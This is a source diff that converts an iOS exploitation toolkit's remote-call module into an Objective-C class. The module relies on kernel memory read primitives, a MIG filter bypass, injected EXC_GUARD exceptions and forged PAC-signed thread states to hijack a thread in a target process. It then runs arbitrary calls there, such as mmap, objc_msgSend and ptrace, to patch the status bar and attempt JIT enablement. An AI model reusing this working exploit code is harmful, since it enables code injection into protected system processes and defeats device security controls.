@@ -454,21 +401,23 @@ bool remote_read(uint64_t src, void *dst, uint64_t size)
     return true;
 }
 
-uint64_t remote_read64(uint64_t src)
+//uint64_t remote_read64(uint64_t src)
+- (uint64_t)remoteRead64From:(uint64_t)src
 {
     uint64_t val = 0;
-    if (!remote_read(src, &val, sizeof(val))) return 0;
+    if (![self remoteRead:src to:&val size:sizeof(val)]) return 0;
     return val;
 }
 
-void remote_hexdump(uint64_t remoteAddr, size_t size)
+//void remote_hexdump(uint64_t remoteAddr, size_t size)
+- (void)remoteHexdumpFrom:(uint64_t)remoteAddr size:(size_t)size
 {
     uint8_t *buf = (uint8_t *)malloc(size);
     if (!buf) {
         return;
     }
 
-    if (!remote_read(remoteAddr, buf, size)) {
+    if (![self remoteRead:remoteAddr to:buf size:size]) {
         printf("[%s:%d] remote_read failed at 0x%llx\n", __FUNCTION__, __LINE__, (unsigned long long)remoteAddr);
         free(buf);
         return;
@@ -500,7 +449,8 @@ void remote_hexdump(uint64_t remoteAddr, size_t size)
     free(buf);
 }
 
-bool remote_write(uint64_t dst, const void *src, uint64_t size)
+//bool remote_write(uint64_t dst, const void *src, uint64_t size)
+- (BOOL)remote_write:(uint64_t)dst from:(const void *)src size:(uint64_t)size
 {
     if (!src || !dst || !size) return false;
     
@@ -514,7 +464,7 @@ bool remote_write(uint64_t dst, const void *src, uint64_t size)
         uint64_t copyCount = (roundUp - dst < remaining) ? (roundUp - dst) : remaining;
         uint64_t pageAddr  = dst & ~PAGE_MASK;
 
-        struct VMShmem *page = get_shmem_for_page(pageAddr);
+        struct VMShmem *page = [self get_shmemForPage:pageAddr];
         if (!page) {
             printf("[%s:%d] remote_write failed: unable to find remote page\n", __FUNCTION__, __LINE__);
             return false;
@@ -527,64 +477,23 @@ bool remote_write(uint64_t dst, const void *src, uint64_t size)
     return true;
 }
 
-bool remote_write64(uint64_t dst, uint64_t val)
+//bool remote_write64(uint64_t dst, uint64_t val)
+- (BOOL)remote_write64:(uint64_t)dst value:(uint64_t)val
 {
-    return remote_write(dst, &val, sizeof(val));
+    return [self remote_write:dst from:&val size:sizeof(val)];
 }
 
-bool remote_writeStr(uint64_t dst, const char *str)
+//bool remote_writeStr(uint64_t dst, const char *str)
+- (BOOL)remote_write:(uint64_t)dst string:(const char *)str
 {
     if (!str) return false;
 
     size_t len = strlen(str) + 1;
-    return remote_write(dst, str, len);
-}
-
-static uint64_t remote_alloc_str(const char *str)
-{
-    uint64_t len = (uint64_t)strlen(str) + 1;
-    uint64_t buf = do_remote_call_stable(5, "malloc", len, 0, 0, 0, 0, 0, 0, 0);
-    if (buf) remote_writeStr(buf, str);
-    return buf;
+    return [self remote_write:dst from:str size:len];
 }
 
-static uint64_t remote_sel(const char *name)
-{
-    uint64_t str = remote_alloc_str(name);
-    uint64_t sel = do_remote_call_stable(5, "sel_registerName", str, 0, 0, 0, 0, 0, 0, 0);
-    do_remote_call_stable(5, "free", str, 0, 0, 0, 0, 0, 0, 0);
-    return sel;
-}
-
-static uint64_t remote_getClass(const char *name)
-{
-    uint64_t str = remote_alloc_str(name);
-    uint64_t cls = do_remote_call_stable(5, "objc_getClass", str, 0, 0, 0, 0, 0, 0, 0);
-    do_remote_call_stable(5, "free", str, 0, 0, 0, 0, 0, 0, 0);
-    return cls;
-}
-
-static uint64_t remote_msg(uint64_t obj, uint64_t sel,
-    uint64_t a0, uint64_t a1, uint64_t a2, uint64_t a3)
-{
-    return do_remote_call_stable(5, "objc_msgSend",
-        obj, sel, a0, a1, a2, a3, 0, 0);
-}
-
-static int remote_errno(void)
-{
-    uint64_t errPtr = do_remote_call_stable(5, "__error", 0, 0, 0, 0, 0, 0, 0, 0);
-    if (!errPtr) return -1;
-
-    int err = 0;
-    if (!remote_read(errPtr, &err, sizeof(err))) return -1;
-    return err;
-}
-
-#define PT_DETACH       11
-#define PT_ATTACHEXC    14
-
-uint64_t retry_first_thread(bool useMigFilterBypass) {
+//uint64_t retry_first_thread(bool useMigFilterBypass) {
+- (uint64_t)retryFirstThreadWithMigFilterBypass:(BOOL)useMigFilterBypass {
     if (useMigFilterBypass)
         mig_bypass_pause();
     
@@ -593,30 +502,19 @@ uint64_t retry_first_thread(bool useMigFilterBypass) {
     if (useMigFilterBypass)
         mig_bypass_resume();
     
-    return kread64(g_RC_taskAddr + off_task_threads_next);
+    return kread64(_taskAddr + off_task_threads_next);
 }
 
 // NOTE: Do not run this function while "attaching xcode" on iOS 18+, it will make device unstable.
-int init_remote_call(const char* process, bool useMigFilterBypass) {
-    if (!process || process[0] == '\0') {
-        printf("[%s:%d] Invalid target process name\n", __FUNCTION__, __LINE__);
-        return -1;
-    }
-
+//int init_remote_call(const char* process, bool useMigFilterBypass) {
+- (int)initRemoteCallForProcess:(const char *)process useMigFilterBypass:(BOOL)useMigFilterBypass {
     uint64_t procAddr = proc_find_by_name(process);
-    if (!procAddr) {
-        printf("[%s:%d] Failed to resolve process '%s'\n", __FUNCTION__, __LINE__, process);
-        return -1;
-    }
-
-    uint32_t procPid = kread32(procAddr + off_proc_p_pid);
-    printf("[%s:%d] process: %s, pid: %u\n",  __FUNCTION__, __LINE__, process, procPid);
-
-    g_RC_taskAddr = proc_task(procAddr);
-    if (!g_RC_taskAddr) {
-        printf("[%s:%d] Failed to resolve task for process '%s'\n", __FUNCTION__, __LINE__, process);
+    if (procAddr == -1) {
+        printf("[%s:%d] Unable to find process: %s\n", __FUNCTION__, __LINE__, process);
         return -1;
     }
+    printf("[%s:%d] process: %s, pid: %u\n",  __FUNCTION__, __LINE__, process, kread32(procAddr + off_proc_p_pid));
+    _taskAddr = proc_task(procAddr);
     
     mach_port_t firstExceptionPort = create_exception_port();
     mach_port_t secondExceptionPort = create_exception_port();
@@ -631,12 +529,13 @@ int init_remote_call(const char* process, bool useMigFilterBypass) {
         return -1;
     }
     
-    disable_excguard_kill(g_RC_taskAddr);
+    // Make sure the task won't crash after we handle an exception
+    disable_excguard_kill(_taskAddr);
     
     mach_exception_code_t guardCode = 0;
     EXC_GUARD_ENCODE_TYPE(guardCode, GUARD_TYPE_MACH_PORT);
     EXC_GUARD_ENCODE_FLAVOR(guardCode, kGUARD_EXC_INVALID_RIGHT);
-    EXC_GUARD_ENCODE_TARGET(guardCode, 0xf503ULL);
+    EXC_GUARD_ENCODE_TARGET(guardCode, 0xf503ULL);  // ??? what is 0xf503 value meaning?
     
     uint64_t firstPortAddr = task_get_ipc_port_kobject(task_self(), firstExceptionPort);
     uint64_t secondPortAddr = task_get_ipc_port_kobject(task_self(), secondExceptionPort);
@@ -651,27 +550,27 @@ int init_remote_call(const char* process, bool useMigFilterBypass) {
     uint64_t selfThreadAddr = task_get_ipc_port_kobject(task_self(), threadSelf);
     uint32_t selfThreadCtid = kread32(selfThreadAddr + off_thread_ctid);
     
-    g_RC_creatingExtraThread = true;
-    g_RC_firstExceptionPort = firstExceptionPort;
-    g_RC_secondExceptionPort = secondExceptionPort;
-    g_RC_firstExceptionPortAddr = firstPortAddr;
-    g_RC_secondExceptionPortAddr = secondPortAddr;
-    g_RC_dummyThread = dummyThread;
-    g_RC_dummyThreadMach = dummyThreadMach;
-    g_RC_dummyThreadAddr = dummyThreadAddr;
-    g_RC_dummyThreadTro = dummyThreadTro;
-    g_RC_selfThreadAddr = selfThreadAddr;
-    g_RC_selfThreadCtid = selfThreadCtid;
+    _creatingExtraThread = true;
+    _firstExceptionPort = firstExceptionPort;
+    _secondExceptionPort = secondExceptionPort;
+    _firstExceptionPortAddr = firstPortAddr;
+    _secondExceptionPortAddr = secondPortAddr;
+    _dummyThread = dummyThread;
+    _dummyThreadMach = dummyThreadMach;
+    _dummyThreadAddr = dummyThreadAddr;
+    _dummyThreadTro = dummyThreadTro;
+    _selfThreadAddr = selfThreadAddr;
+    _selfThreadCtid = selfThreadCtid;
     
-    g_RC_threadList = [NSMutableArray new];
+    self.threadList = [NSMutableArray new];
     
     int retryCount = 0;
     int validThreadCount = 0;
     int successThreadCount = 0;
-    uint64_t firstThread = kread64(g_RC_taskAddr + off_task_threads_next);
+    uint64_t firstThread = kread64(_taskAddr + off_task_threads_next);
     uint64_t currThread = firstThread;
     
-    g_RC_trojanThreadAddr = firstThread;
+    _trojanThreadAddr = firstThread;
     
     if (useMigFilterBypass)
         mig_bypass_resume();
@@ -681,7 +580,7 @@ int init_remote_call(const char* process, bool useMigFilterBypass) {
         if (!task) {
             if (!validThreadCount) {
                 printf("[%s:%d] failed on getting first thread at all, resetting\n", __FUNCTION__, __LINE__);
-                firstThread = retry_first_thread(useMigFilterBypass);
+                firstThread = [self retryFirstThreadWithMigFilterBypass:useMigFilterBypass];
                 currThread = firstThread;
                 retryCount++;
                 continue;
@@ -690,36 +589,37 @@ int init_remote_call(const char* process, bool useMigFilterBypass) {
             }
         }
         
-        if (task == g_RC_taskAddr) {
-            if (!set_exception_port_on_thread(g_RC_firstExceptionPort, currThread, useMigFilterBypass)) {
+        if (task == _taskAddr) {
+            if (![self setExceptionPortOnThread:firstExceptionPort forThread:currThread useMigFilterBypass:useMigFilterBypass]) {
                 printf("[%s:%d] Set exception port on thread:0x%llx failed\n", __FUNCTION__, __LINE__, (unsigned long long)currThread);
                 if (!validThreadCount) {
                     printf("[%s:%d] failed on first thread, resetting first thread and currThread\n", __FUNCTION__, __LINE__);
-                    firstThread = retry_first_thread(useMigFilterBypass);
+                    firstThread = [self retryFirstThreadWithMigFilterBypass:useMigFilterBypass];
                     currThread = firstThread;
                     retryCount++;
                     continue;
                 }
             } else {
+                // Inject a EXC_GUARD exception on this thread
                 if (!inject_guard_exception(currThread, guardCode)) {
                     printf("[%s:%d] Inject EXC_GUARD on thread:0x%llx failed, not injecting\n", __FUNCTION__, __LINE__, (unsigned long long)currThread);
                     if (!validThreadCount) {
                         printf("[%s:%d] failed on first thread, resetting first thread and currThread\n", __FUNCTION__, __LINE__);
-                        firstThread = retry_first_thread(useMigFilterBypass);
+                        firstThread = [self retryFirstThreadWithMigFilterBypass:useMigFilterBypass];
                         currThread = firstThread;
                         retryCount++;
                         continue;
                     }
                 } else {
                     successThreadCount++;
-                    [g_RC_threadList addObject:@(currThread)];
+                    [_threadList addObject:@(currThread)];
                     printf("[%s:%d] Inject EXC_GUARD on thread:0x%llx OK\n", __FUNCTION__, __LINE__, (unsigned long long)currThread);
                 }
             }
             validThreadCount++;
         } else if (task && !validThreadCount) {
             printf("[%s:%d] Got weird tro on first thread, resetting\n", __FUNCTION__, __LINE__);
-            firstThread = retry_first_thread(useMigFilterBypass);
+            firstThread = [self retryFirstThreadWithMigFilterBypass:useMigFilterBypass];
             currThread = firstThread;
             retryCount++;
             continue;
@@ -729,7 +629,7 @@ int init_remote_call(const char* process, bool useMigFilterBypass) {
         if (!next) {
             if (!validThreadCount) {
                 printf("[%s:%d] Got empty next thread. Retry\n", __FUNCTION__, __LINE__);
-                firstThread = retry_first_thread(useMigFilterBypass);
+                firstThread = [self retryFirstThreadWithMigFilterBypass:useMigFilterBypass];
                 currThread = firstThread;
                 retryCount++;
                 continue;
@@ -747,22 +647,22 @@ int init_remote_call(const char* process, bool useMigFilterBypass) {
     printf("[%s:%d] Valid threads: %d\n", __FUNCTION__, __LINE__, validThreadCount);
     printf("[%s:%d] Injected threads: %d\n", __FUNCTION__, __LINE__, successThreadCount);
     
-    if (g_RC_threadList.count == 0) {
+    if (_threadList.count == 0) {
         printf("[%s:%d] Exception injection failed. Aborting.\n", __FUNCTION__, __LINE__);
-        destroy_remote_call();
+        [self destroyRemoteCall];
         return -1;
     }
     
     ExceptionMessage exc;
     if(!wait_exception(firstExceptionPort, &exc, 120000, false)) {
         printf("[%s:%d] Failed to receive first exception\n", __FUNCTION__, __LINE__);
-        destroy_remote_call();
+        [self destroyRemoteCall];
         return -1;
     }
     
-    memcpy(&g_RC_originalState, &exc.threadState, sizeof(arm_thread_state64_internal));
+    memcpy(&_originalState, &exc.threadState, sizeof(arm_thread_state64_internal));
     
-    for (NSNumber *thread in g_RC_threadList) {
+    for (NSNumber *thread in _threadList) {
         clear_guard_exception(thread.unsignedLongLongValue);
     }
     printf("[%s:%d] Finish clearing EXC_GUARD from all other threads...\n", __FUNCTION__, __LINE__);
@@ -780,47 +680,47 @@ int init_remote_call(const char* process, bool useMigFilterBypass) {
     arm_thread_state64_internal newState = exc.threadState;
     printf("[%s:%d] calling sign_state for FAKE_PC_TROJAN_CREATOR...\n", __FUNCTION__, __LINE__);
     fflush(stdout);
-    sign_state(firstThread, &newState, FAKE_PC_TROJAN_CREATOR, FAKE_LR_TROJAN_CREATOR);
+    [self signState:_trojanThreadAddr withState:&newState pc:FAKE_PC_TROJAN_CREATOR lr:FAKE_LR_TROJAN_CREATOR];
     printf("[%s:%d] sign_state done, pc=0x%llx lr=0x%llx flags=0x%x\n",
            __FUNCTION__, __LINE__, newState.__pc, newState.__lr, newState.__flags);
     fflush(stdout);
     reply_with_state(&exc, &newState);
     printf("[%s:%d] reply_with_state done, waiting for crash...\n", __FUNCTION__, __LINE__);
     fflush(stdout);
     
-    g_RC_vmMap = task_get_vm_map(g_RC_taskAddr);
-    printf("[%s:%d] vmMap: 0x%llx\n", __FUNCTION__, __LINE__, g_RC_vmMap);
+    _vmMap = task_get_vm_map(_taskAddr);
+    printf("[%s:%d] vmMap: 0x%llx\n", __FUNCTION__, __LINE__, _vmMap);
     fflush(stdout);
     
     printf("[%s:%d] signing FAKE_PC_TROJAN via remote_pac...\n", __FUNCTION__, __LINE__);
     fflush(stdout);
-    uint64_t remoteCrashSigned = remote_pac(g_RC_trojanThreadAddr, FAKE_PC_TROJAN, 0);
+    uint64_t remoteCrashSigned = remote_pac(_trojanThreadAddr, FAKE_PC_TROJAN, 0);
     printf("[%s:%d] remoteCrashSigned: 0x%llx\n", __FUNCTION__, __LINE__, remoteCrashSigned);
     fflush(stdout);
-    do_remote_call_temp(100, "getpid", 0, 0, 0, 0, 0, 0, 0, 0); // for testing
-    do_remote_call_temp(100, "pthread_create_suspended_np", trojanMemTemp, 0, remoteCrashSigned, 0, 0, 0, 0, 0);
+    RemoteArbCallTempWithTimeout(100, self, getpid); // for testing
+    RemoteArbCallTempWithTimeout(100, self, pthread_create_suspended_np, trojanMemTemp, 0, remoteCrashSigned, 0);
     
     printf("[%s:%d] trojanMemTemp: 0x%llx\n", __FUNCTION__, __LINE__, trojanMemTemp);
-    uint64_t pthreadAddr    = remote_read64(trojanMemTemp);
+    uint64_t pthreadAddr    = self[trojanMemTemp].value64;
     printf("[%s:%d] pthreadAddr: 0x%llx\n", __FUNCTION__, __LINE__, pthreadAddr);
-    uint64_t callThreadPort = do_remote_call_temp(100, "pthread_mach_thread_np", pthreadAddr, 0, 0, 0, 0, 0, 0, 0);
+    uint64_t callThreadPort = RemoteArbCallTempWithTimeout(100, self, pthread_mach_thread_np, pthreadAddr);
     printf("[%s:%d] callThreadPort: 0x%llx\n", __FUNCTION__, __LINE__, callThreadPort);
-    g_RC_callThreadAddr = task_get_ipc_port_kobject(g_RC_taskAddr, (mach_port_t)callThreadPort);
+    _callThreadAddr = task_get_ipc_port_kobject(_taskAddr, (mach_port_t)callThreadPort);
     
     if(useMigFilterBypass)
         mig_bypass_resume();
     
-    if (!set_exception_port_on_thread(secondExceptionPort, g_RC_callThreadAddr, useMigFilterBypass)) {
+    if (![self setExceptionPortOnThread:secondExceptionPort forThread:_callThreadAddr useMigFilterBypass:useMigFilterBypass]) {
         printf("[%s:%d] Failed set exc port on new thread, retrying...\n", __FUNCTION__, __LINE__);
         pthread_create_suspended_np(&dummyThread, NULL, (void *(*)(void *))dummyFunc, NULL);
-        g_RC_dummyThreadMach = pthread_mach_thread_np(dummyThread);
-        g_RC_dummyThreadAddr = task_get_ipc_port_kobject(mach_task_self_, g_RC_dummyThreadMach);
-        g_RC_dummyThreadTro  = kread64(g_RC_dummyThreadAddr + off_thread_t_tro);
+        _dummyThreadMach = pthread_mach_thread_np(dummyThread);
+        _dummyThreadAddr = task_get_ipc_port_kobject(mach_task_self_, _dummyThreadMach);
+        _dummyThreadTro  = thread_get_t_tro(_dummyThreadAddr);
         sleep(1);
-        if (!set_exception_port_on_thread(secondExceptionPort, g_RC_callThreadAddr, useMigFilterBypass)) {
+        if (![self setExceptionPortOnThread:secondExceptionPort forThread:_callThreadAddr useMigFilterBypass:useMigFilterBypass]) {
             if(useMigFilterBypass)
                 mig_bypass_pause();
-            destroy_remote_call();
+            [self destroyRemoteCall];
             return -1;
         }
     }
@@ -830,239 +730,349 @@ int init_remote_call(const char* process, bool useMigFilterBypass) {
     
     printf("[%s:%d] All good! Resuming trojan thread...\n", __FUNCTION__, __LINE__);
     
-    uint64_t ret = do_remote_call_temp(100, "thread_resume", callThreadPort, 0, 0, 0, 0, 0, 0, 0);
+    uint64_t ret = RemoteArbCallTempWithTimeout(100, self, thread_resume, callThreadPort);
     if (ret != 0) {
         printf("[%s:%d] Couldn't resume new thread, falling back to original\n", __FUNCTION__, __LINE__);
-        g_RC_creatingExtraThread = false;
+        _creatingExtraThread = false;
     }
     
-    if (g_RC_creatingExtraThread) {
+    if (_creatingExtraThread) {
         printf("[%s:%d] New thread created, resuming original\n", __FUNCTION__, __LINE__);
-        restore_trojan_thread(&g_RC_originalState);
+        //restore_trojan_thread(&_originalState);
+        [self restoreTrojanThreadWithState:&_originalState];
     }
     printf("[%s:%d] Original thread restored\n", __FUNCTION__, __LINE__);
     
-    g_RC_pid = (int)do_remote_call_stable(100, "getpid", 0, 0, 0, 0, 0, 0, 0, 0);
-    printf("[%s:%d] Task pid: %d\n", __FUNCTION__, __LINE__, g_RC_pid);
+    _pid = (int)RemoteArbCallWithTimeout(100, self, getpid);
+    printf("[%s:%d] Task pid: %d\n", __FUNCTION__, __LINE__, _pid);
     
-    g_RC_trojanMem = do_remote_call_stable(1000, "mmap", 0, PAGE_SIZE, VM_PROT_READ | VM_PROT_WRITE, MAP_PRIVATE | MAP_ANON, (uint64_t)-1, 0, 0, 0);
+    _trojanMem = RemoteArbCallWithTimeout(100, self, mmap, 0, PAGE_SIZE, VM_PROT_READ | VM_PROT_WRITE, MAP_PRIVATE | MAP_ANON, (uint64_t)-1, 0);
     
-    do_remote_call_stable(100, "memset", g_RC_trojanMem, 0, PAGE_SIZE, 0, 0, 0, 0, 0);
+    RemoteArbCallWithTimeout(100, self, memset, _trojanMem, 0, PAGE_SIZE);
     
-    g_RC_success = true;
+    _success = true;
     printf("[%s:%d] Finished successfully\n", __FUNCTION__, __LINE__);
     
     return 0;
 }
 
-void status_bar_tweak(void)
+- (instancetype)initWithProcess:(NSString *)process useMigFilterBypass:(BOOL)useMigFilterBypass {
+    self = [super init];
+    if ([self initRemoteCallForProcess:process.UTF8String useMigFilterBypass:useMigFilterBypass]) {
+        NSLog(@"[%s:%d] initRemoteCallForProcess failed", __FUNCTION__, __LINE__);
+        return nil;
+    }
+    return self;
+}
+
+// read/write memory via subscripting
+- (RemotePointer *)objectAtIndexedSubscript:(uint64_t)address {
+    return [[RemotePointer alloc] initWithRemoteCall:self address:address];
+}
+
+@end
+
+@implementation RemotePointer
+- (instancetype)initWithRemoteCall:(RemoteCall *)remoteCall address:(NSUInteger)address {
+    self = [super init];
+    _remoteCall = remoteCall;
+    _address = address;
+    return self;
+}
+
+- (void)setString:(NSString *)string {
+    [self.remoteCall remote_write:_address string:string.UTF8String];
+}
+- (void)setValue8:(uint8_t)val {
+    [self.remoteCall remote_write:_address from:&val size:sizeof(val)];
+}
+- (void)setValue16:(uint16_t)val {
+    [self.remoteCall remote_write:_address from:&val size:sizeof(val)];
+}
+- (void)setValue32:(uint32_t)val {
+    [self.remoteCall remote_write:_address from:&val size:sizeof(val)];
+}
+- (void)setValue64:(uint64_t)val {
+    [self.remoteCall remote_write:_address from:&val size:sizeof(val)];
+}
+
+- (NSString *)string {
+    // I'm lazy to deal with mem leak so I'm just wrapping it to NSString for ARC to do its job
+    size_t len = RemoteArbCall(self.remoteCall, strlen, _address);
+    char *buf = malloc(len + 1);
+    if (!buf) return nil;
+    [self.remoteCall remoteRead:_address to:buf size:len];
+    buf[len] = '\0';
+    NSString *result = @(buf);
+    free(buf);
+    return result;
+}
+- (uint8_t)value8 {
+    uint8_t val = 0;
+    [self.remoteCall remoteRead:_address to:&val size:sizeof(val)];
+    return val;
+}
+- (uint16_t)value16 {
+    uint16_t val = 0;
+    [self.remoteCall remoteRead:_address to:&val size:sizeof(val)];
+    return val;
+}
+- (uint32_t)value32 {
+    uint32_t val = 0;
+    [self.remoteCall remoteRead:_address to:&val size:sizeof(val)];
+    return val;
+}
+- (uint64_t)value64 {
+    uint64_t val = 0;
+    [self.remoteCall remoteRead:_address to:&val size:sizeof(val)];
+    return val;
+}
+@end
+
+static uint64_t remote_alloc_str(RemoteCall *proc, const char *str)
+{
+    uint64_t len = strlen(str) + 1;
+    uint64_t buf = RemoteArbCall(proc, malloc, len);
+    if (buf) proc[buf].string = @(str);
+    return buf;
+}
+
+static uint64_t remote_sel(RemoteCall *proc, const char *name)
+{
+    uint64_t str = remote_alloc_str(proc, name);
+    uint64_t sel = RemoteArbCall(proc, sel_registerName, str);
+    RemoteArbCall(proc, free, str);
+    return sel;
+}
+
+static uint64_t remote_getClass(RemoteCall *proc, const char *name)
 {
-    if (!g_RC_trojanMem) {
+    uint64_t str = remote_alloc_str(proc, name);
+    uint64_t cls = RemoteArbCall(proc, objc_getClass, str);
+    RemoteArbCall(proc, free, str);
+    return cls;
+}
+
+static uint64_t remote_msg(RemoteCall *proc, uint64_t obj, uint64_t sel,
+    uint64_t a0, uint64_t a1, uint64_t a2, uint64_t a3)
+{
+    return RemoteArbCall(proc, objc_msgSend, obj, sel, a0, a1, a2, a3);
+}
+
+static int remote_errno(RemoteCall *proc)
+{
+    uint64_t errPtr = RemoteArbCall(proc, __error);
+    if (!errPtr) return -1;
+
+    return proc[errPtr].value32;
+}
+
+uint64_t remote_NSString(RemoteCall *proc, const char *str)
+{
+    uint64_t sel_stringWithCString = remote_sel(proc, "stringWithCString:");
+    uint64_t cls_NSString = remote_getClass(proc, "NSString");
+    uint64_t resultCStr = remote_alloc_str(proc, str);
+    uint64_t result = remote_msg(proc, cls_NSString, sel_stringWithCString, resultCStr, 0, 0, 0);
+    RemoteArbCall(proc, free, resultCStr);
+    return result;
+}
+
+int ptrace(int _request, pid_t _pid, caddr_t _addr, int _data);
+#define PT_DETACH       11
+#define PT_ATTACHEXC    14
+
+void status_bar_tweak(RemoteCall *proc)
+{
+    if (!proc) {
         printf("(rc) RemoteCall not initialized\n");
         return;
     }
 
     printf("(rc) Adding heart beside time...\n");
 
     const char *heartFmt = "HH:mm - E d/M/yyyy";
-    uint64_t fmtBuf = remote_alloc_str(heartFmt);
-    uint64_t fmtNSStr = do_remote_call_stable(5, "CFStringCreateWithCString",
-        0, fmtBuf, 0x08000100, 0, 0, 0, 0, 0);
-    do_remote_call_stable(5, "free", fmtBuf, 0, 0, 0, 0, 0, 0, 0);
-
-    uint64_t selSharedApp   = remote_sel("sharedApplication");
-    uint64_t selAggregator  = remote_sel("statusBarStateAggregator");
-    uint64_t selValueForKey = remote_sel("valueForKey:");
-    uint64_t selSetDateFmt  = remote_sel("setDateFormat:");
-    uint64_t selUpdateTime  = remote_sel("_updateTimeItems");
-
-    uint64_t uiAppCls = remote_getClass("UIApplication");
-    uint64_t app = remote_msg(uiAppCls, selSharedApp, 0, 0, 0, 0);
+    uint64_t fmtNSStr = remote_NSString(proc, heartFmt);
+
+    uint64_t selSharedApp   = remote_sel(proc, "sharedApplication");
+    uint64_t selAggregator  = remote_sel(proc, "statusBarStateAggregator");
+    uint64_t selValueForKey = remote_sel(proc, "valueForKey:");
+    uint64_t selSetDateFmt  = remote_sel(proc, "setDateFormat:");
+    uint64_t selUpdateTime  = remote_sel(proc, "_updateTimeItems");
+
+    uint64_t uiAppCls = remote_getClass(proc, "UIApplication");
+    uint64_t app = remote_msg(proc, uiAppCls, selSharedApp, 0, 0, 0, 0);
     printf("(rc) app = 0x%llx\n", app);
 
-    uint64_t agg = remote_msg(app, selAggregator, 0, 0, 0, 0);
+    uint64_t agg = remote_msg(proc, app, selAggregator, 0, 0, 0, 0);
     printf("(rc) aggregator = 0x%llx\n", agg);
 
     if (agg) {
-        uint64_t keyBuf = remote_alloc_str("_timeItemDateFormatter");
-        uint64_t keyStr = do_remote_call_stable(5, "CFStringCreateWithCString",
-            0, keyBuf, 0x08000100, 0, 0, 0, 0, 0);
-        uint64_t fmtr = remote_msg(agg, selValueForKey, keyStr, 0, 0, 0);
-        do_remote_call_stable(5, "free", keyBuf, 0, 0, 0, 0, 0, 0, 0);
-        do_remote_call_stable(5, "CFRelease", keyStr, 0, 0, 0, 0, 0, 0, 0);
+        uint64_t keyStr = remote_NSString(proc, "_timeItemDateFormatter");
+        uint64_t fmtr = remote_msg(proc, agg, selValueForKey, keyStr, 0, 0, 0);
+        RemoteArbCall(proc, CFRelease, keyStr);
         printf("(rc) _timeItemDateFormatter = 0x%llx\n", fmtr);
 
         if (fmtr) {
-            remote_msg(fmtr, selSetDateFmt, fmtNSStr, 0, 0, 0);
+            remote_msg(proc, fmtr, selSetDateFmt, fmtNSStr, 0, 0, 0);
             printf("(rc) Set format: HH:mm ❤️\n");
         }
 
-        uint64_t key2Buf = remote_alloc_str("_shortTimeItemDateFormatter");
-        uint64_t key2Str = do_remote_call_stable(5, "CFStringCreateWithCString",
-            0, key2Buf, 0x08000100, 0, 0, 0, 0, 0);
-        uint64_t fmtr2 = remote_msg(agg, selValueForKey, key2Str, 0, 0, 0);
-        do_remote_call_stable(5, "free", key2Buf, 0, 0, 0, 0, 0, 0, 0);
-        do_remote_call_stable(5, "CFRelease", key2Str, 0, 0, 0, 0, 0, 0, 0);
+        uint64_t key2Str = remote_NSString(proc, "_shortTimeItemDateFormatter");
+        uint64_t fmtr2 = remote_msg(proc, agg, selValueForKey, key2Str, 0, 0, 0);
+        RemoteArbCall(proc, CFRelease, key2Str);
         if (fmtr2) {
-            remote_msg(fmtr2, selSetDateFmt, fmtNSStr, 0, 0, 0);
+            remote_msg(proc, fmtr2, selSetDateFmt, fmtNSStr, 0, 0, 0);
             printf("(rc) Also patched _shortTimeItemDateFormatter\n");
         }
 
-        uint64_t selPerform = remote_sel("performSelectorOnMainThread:withObject:waitUntilDone:");
-        remote_msg(agg, selPerform, selUpdateTime, 0 /*nil*/, 0 /*NO*/, 0);
+        uint64_t selPerform = remote_sel(proc, "performSelectorOnMainThread:withObject:waitUntilDone:");
+        remote_msg(proc, agg, selPerform, selUpdateTime, 0 /*nil*/, 0 /*NO*/, 0);
     }
 
     printf("(rc) done\n");
 }
 
 
 // doesnt work probably
-int enable_jit(const char *bid) {
-    if (!g_RC_trojanMem) {
-        printf("(rc) RemoteCall not initialized\n");
-        return -1;
-    }
+int enable_jit(RemoteCall *proc, const char *bid) {
     if (!bid || bid[0] == '\0') {
         return EINVAL;
     }
 
-    uint64_t predcls = remote_getClass("RBSProcessPredicate");
-    uint64_t handlecls = remote_getClass("RBSProcessHandle");
+    uint64_t predcls = remote_getClass(proc, "RBSProcessPredicate");
+    uint64_t handlecls = remote_getClass(proc, "RBSProcessHandle");
     if (!predcls || !handlecls) {
         printf("(rc) RunningBoardServices classes not found\n");
         return ENOENT;
     }
 
-    uint64_t bundlebuf = remote_alloc_str(bid);
-    uint64_t bundlestr = do_remote_call_stable(5, "CFStringCreateWithCString",
-        0, bundlebuf, 0x08000100, 0, 0, 0, 0, 0);
-    do_remote_call_stable(5, "free", bundlebuf, 0, 0, 0, 0, 0, 0, 0);
+    uint64_t bundlestr = remote_NSString(proc, bid);
     if (!bundlestr) {
         return ENOMEM;
     }
 
-    uint64_t selpredmatch = remote_sel("predicateMatchingBundleIdentifier:");
-    uint64_t selhandlefor = remote_sel("handleForPredicate:error:");
-    uint64_t selpid = remote_sel("rbs_pid");
+    uint64_t selpredmatch = remote_sel(proc, "predicateMatchingBundleIdentifier:");
+    uint64_t selhandlefor = remote_sel(proc, "handleForPredicate:error:");
+    uint64_t selpid = remote_sel(proc, "rbs_pid");
 
-    uint64_t predicate = remote_msg(predcls, selpredmatch, bundlestr, 0, 0, 0);
-    uint64_t process = remote_msg(handlecls, selhandlefor, predicate, 0 /*NSError ** == nil*/, 0, 0);
-    uint64_t pid = remote_msg(process, selpid, 0, 0, 0, 0) & 0xffffffffULL;
+    uint64_t predicate = remote_msg(proc, predcls, selpredmatch, bundlestr, 0, 0, 0);
+    uint64_t process = remote_msg(proc, handlecls, selhandlefor, predicate, 0 /*NSError ** == nil*/, 0, 0);
+    uint64_t pid = remote_msg(proc, process, selpid, 0, 0, 0, 0) & 0xffffffffULL;
 
-    do_remote_call_stable(5, "CFRelease", bundlestr, 0, 0, 0, 0, 0, 0, 0);
+    RemoteArbCall(proc, CFRelease, bundlestr);
 
     if (!pid) {
         return ESRCH;
     }
 
-    uint64_t ret = do_remote_call_stable(5, "ptrace", PT_ATTACHEXC, pid, 0, 0, 0, 0, 0, 0);
+    uint64_t ret = RemoteArbCall(proc, ptrace, PT_ATTACHEXC, pid, 0, 0, 0);
     if (ret == (uint64_t)-1) {
-        int err = remote_errno();
+        int err = remote_errno(proc);
         return err > 0 ? err : EPERM;
     }
 
-    do_remote_call_stable(5, "usleep", 100000, 0, 0, 0, 0, 0, 0, 0);
+    usleep(100000);
 
-    ret = do_remote_call_stable(5, "ptrace", PT_DETACH, pid, 0, 0, 0, 0, 0, 0);
+    ret = RemoteArbCall(proc, ptrace, PT_DETACH, pid, 0, 0, 0);
     if (ret == (uint64_t)-1) {
-        int err = remote_errno();
+        int err = remote_errno(proc);
         return err > 0 ? err : EPERM;
     }
 
     return 0;
 }
 
